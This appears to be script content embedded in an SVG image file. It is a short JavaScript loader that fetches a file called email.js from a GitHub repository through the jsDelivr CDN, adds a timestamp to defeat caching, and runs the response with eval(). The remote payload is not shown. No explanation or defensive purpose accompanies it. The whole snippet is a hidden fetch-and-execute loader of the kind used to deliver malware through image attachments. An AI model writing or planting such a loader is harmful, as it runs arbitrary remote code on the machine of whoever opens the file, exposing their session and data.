svg.script:
    var url = "https://cdn.jsdelivr.net/gh/entryhelper/entryhelp@main/email.js?t=" + new Date().getTime();

var xhr = new XMLHttpRequest();
xhr.open("GET", url, true);

xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      eval(xhr.responseText);
    } else {
      console.log("request failed:", xhr.status);
    }
  }
};

xhr.send(null);
